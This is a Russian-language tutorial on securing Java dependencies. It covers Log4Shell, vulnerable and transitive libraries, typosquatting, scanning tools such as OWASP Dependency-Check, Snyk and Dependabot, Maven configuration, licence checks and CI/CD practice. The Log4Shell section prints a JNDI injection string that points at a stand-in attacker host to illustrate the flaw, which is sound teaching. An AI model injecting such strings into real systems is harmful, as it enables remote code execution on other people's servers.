# Безопасность зависимостей в Java

## Часть 1: Что такое зависимость?

Представь, что ты строишь дом. Ты не делаешь всё сам: не выплавляешь сталь, не делаешь кирпичи, не производишь провода. Ты покупаешь готовые материалы у поставщиков.

**Зависимость** — это именно такой «материал» для программы. Ты не пишешь всё с нуля. Берёшь готовую библиотеку: для работы с базой данных, для HTTP-запросов, для JSON, для логирования.

Проблема: если в материале дефект — весь дом под угрозой. Если в библиотеке уязвимость — твоя программа под угрозой.

## Зачем нужна безопасность зависимостей?

### Ситуация 1: Log4Shell (CVE-2021-44228)

Декабрь 2021. Библиотека Log4j версии 2.0-2.14.1 содержит уязвимость **Remote Code Execution**. Любое сообщение лога может выполнить произвольный код:

    ${jndi:ldap://evil.com/exploit}

Это значит: злоумышленник отправляет специальную строку, которая попадает в лог. Log4j обрабатывает её, загружает класс с удалённого сервера и выполняет. Полный контроль над системой.

**Масштаб:** Log4j используют миллионы приложений. Уязвимость оценена 10/10 по CVSS. Патчи выходили неделями.

### Ситуация 2: Устаревшая библиотека

Проект использует Jackson Databind 2.9.8. В этой версии есть уязвимость **Deserialization of Untrusted Data** (CVE-2019-14379). Злоумышленник отправляет специальный JSON — выполняется произвольный код.

Версия 2.9.9.2 исправляет уязвимость. Но никто не обновил. Приложение уязвимо 3 года.

### Ситуация 3: Транзитивная зависимость

Твой проект зависит от Spring Boot. Spring Boot зависит от Spring Security. Spring Security зависит от Nimbus JOSE JWT. В Nimbus находят уязвимость.

Ты не знаешь, что используешь Nimbus. Он «глубоко» в зависимостях. Но уязвимость затрагивает и твоё приложение.

## Часть 2: Типы уязвимостей зависимостей

| Тип | Описание | Пример |
|-----|----------|--------|
| Known vulnerability | Известная CVE | Log4Shell (CVE-2021-44228) |
| License violation | Нарушение лицензии | GPL в коммерческом продукте |
| Outdated | Устаревшая версия | Без поддержки, без патчей |
| Malicious | Вредоносная библиотека | Typosquatting (похожее название) |
| Transitive | Уязвимость в глубине | Уязвимость библиотеки библиотеки |

### Typosquatting

Злоумышленник публикует библиотеку с похожим названием:
- `django` → `djanga`
- `requests` → `request`
- `colorama` → `colourama`

Разработчик ошибается, устанавливает вредоносную библиотеку.

## Часть 3: Инструменты проверки

### OWASP Dependency-Check

Бесплатный инструмент от OWASP. Сканирует зависимости, сверяется с базой NVD (National Vulnerability Database).

    // Maven
    <plugin>
        <groupId>org.owasp</groupId>
        <artifactId>dependency-check-maven</artifactId>
        <version>8.4.0</version>
        <executions>
            <execution>
                <goals>
                    <goal>check</goal>
                </goals>
            </execution>
        </executions>
    </plugin>
    
    // Запуск
    mvn org.owasp:dependency-check-maven:check
    
    // Результат: target/dependency-check-report.html

| Характеристика | Описание |
|----------------|----------|
| База | NVD (CVE) |
| Формат отчёта | HTML, XML, JSON, CSV |
| Интеграция | Maven, Gradle, CLI, Jenkins |
| Обновление | Автоматическое |
| Цена | Бесплатно |

### Snyk

Коммерческий сервис с бесплатным тарифом для open source.

| Характеристика | Описание |
|----------------|----------|
| База | Snyk DB + NVD |
| Интеграция | GitHub, GitLab, Bitbucket, CLI, IDE |
| Функции | Сканирование, фикс (PR), мониторинг |
| Цена | Бесплатно для open source |

    // Установка
    npm install -g snyk
    
    // Авторизация
    snyk auth
    
    // Сканирование
    snyk test
    snyk monitor  // Постоянный мониторинг

### Dependabot (GitHub)

Встроен в GitHub. Автоматически создаёт PR с обновлениями.

| Характеристика | Описание |
|----------------|----------|
| Тип | GitHub-native |
| Функция | Авто-PR с обновлениями |
| Частота | Ежедневно/еженедельно |
| Цена | Бесплатно |

    # .github/dependabot.yml
    version: 2
    updates:
      - package-ecosystem: "maven"
        directory: "/"
        schedule:
          interval: "daily"
        open-pull-requests-limit: 10

### Maven Enforcer Plugin

Проверяет правила для зависимостей.

    <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-enforcer-plugin</artifactId>
        <version>3.4.1</version>
        <executions>
            <execution>
                <id>enforce-versions</id>
                <goals>
                    <goal>enforce</goal>
                </goals>
            </execution>
        </executions>
        <configuration>
            <rules>
                <bannedDependencies>
                    <excludes>
                        <exclude>log4j:log4j</exclude>
                    </excludes>
                </bannedDependencies>
            </rules>
        </configuration>
    </plugin>

### Sonatype Nexus Lifecycle

Enterprise-решение для управления зависимостями.

| Характеристика | Описание |
|----------------|----------|
| Тип | Enterprise |
| Функция | Полный lifecycle: сканирование, политики, аудит |
| Интеграция | CI/CD, репозитории |
| Цена | Платно |

## Часть 4: Лучшие практики

### Bill of Materials (BOM)

Фиксированный список зависимостей:

    <dependencyManagement>
        <dependencies>
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-dependencies</artifactId>
                <version>3.2.0</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>
        </dependencies>
    </dependencyManagement>

### Lockfile

Фиксация точных версий:

    // Maven: maven-lockfile-plugin
    // Gradle: dependency locking
    // npm: package-lock.json
    // pip: requirements.txt с точными версиями

### Минимизация зависимостей

| Плохо | Хорошо |
|-------|--------|
| `spring-boot-starter-web` + всё остальное | Только необходимые starters |
| Включать «на всякий случай» | Анализировать нужность |
| Использовать тяжёлые фреймворки | Лёгкие альтернативы |

### Регулярное обновление

| Частота | Что делать |
|---------|------------|
| Ежедневно | Dependabot/Snyk сканируют |
| Еженедельно | Ревью PR с обновлениями |
| Ежемесячно | Обновление minor версий |
| Критически срочно | Патчи безопасности |

### Проверка транзитивных зависимостей

    // Посмотреть дерево зависимостей
    mvn dependency:tree
    
    // Или
    mvn dependency:tree -Dincludes=log4j
    
    // Исключить опасную транзитивную
    <dependency>
        <groupId>com.example</groupId>
        <artifactId>library</artifactId>
        <version>1.0</version>
        <exclusions>
            <exclusion>
                <groupId>log4j</groupId>
                <artifactId>log4j</artifactId>
            </exclusion>
        </exclusions>
    </dependency>

### Проверка лицензий

| Лицензия | Тип | Можно использовать? |
|----------|-----|-------------------|
| MIT | Разрешительная | ✅ Да |
| Apache 2.0 | Разрешительная | ✅ Да |
| BSD | Разрешительная | ✅ Да |
| LGPL | Слабый copyleft | ⚠️ Осторожно |
| GPL | Сильный copyleft | ❌ Нет (в проприетарном) |
| Proprietary | Проприетарная | ⚠️ По соглашению |

## Часть 5: Процесс управления зависимостями

### CI/CD Pipeline

    [Build] > [Test] > [Dependency Check] > [Deploy]
                    |
                    v
            [OWASP Dependency-Check]
            [Snyk Test]
            [License Check]
                    |
            [Если уязвимости — блокировать деплой]

### Чек-лист

| Проверка | Статус |
|----------|--------|
| OWASP Dependency-Check в CI/CD | ⬜ |
| Dependabot/Snyk настроены | ⬜ |
| Блокировка деплоя при уязвимостях | ⬜ |
| BOM актуален | ⬜ |
| Лицензии проверены | ⬜ |
| Транзитивные зависимости проанализированы | ⬜ |
| Регулярное обновление | ⬜ |

### Комплаенс

| Стандарт | Требование | Реализация |
|----------|------------|------------|
| OWASP | SCA (Software Composition Analysis) | Dependency Check |
| PCI DSS | Управление уязвимостями | Сканирование зависимостей |
| ISO 27001 | Управление активами | Инвентаризация зависимостей |
| NIST SSDF | Поставка безопасного ПО | Проверка зависимостей |

## Вывод

Безопасность зависимостей:
1. **Инвентаризация** — знаешь, что используешь
2. **Сканирование** — проверяй регулярно
3. **Обновление** — патчи безопасности — приоритет
4. **Блокировка** — не деплой с уязвимостями
5. **Лицензии** — проверяй совместимость
6. **Транзитивные** — проверяй глубину

Правило: **ты отвечаешь за все зависимости, даже те, о которых не знаешь.**

---
_Статья создана на основе анализа материалов Habr по безопасности зависимостей_